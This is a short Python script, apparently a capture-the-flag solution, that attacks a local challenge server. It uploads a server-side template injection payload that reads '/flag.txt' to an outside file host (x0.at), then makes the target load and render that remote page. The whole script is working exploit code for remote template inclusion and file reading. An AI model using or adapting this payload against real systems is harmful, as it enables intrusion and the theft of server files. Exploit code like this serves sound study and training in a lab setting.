import requests

HOST, PORT = "127.0.0.1", 1337
CHALLENGE_URL = f"http://{HOST}:{PORT}"
FILE_HOST = "https://x0.at"

def pwn():
    with requests.Session() as session:
        flag_file = session.post(FILE_HOST, files={"file": "{{ .OutFileContents \"/flag.txt\" }}"}).text.strip()
        
        print(flag_file)

        flag = session.get(f'{CHALLENGE_URL}/view?remote=true&page={flag_file}').text

        return flag


def main():
    flag = pwn()
    print(flag)


if __name__ == "__main__":
    main()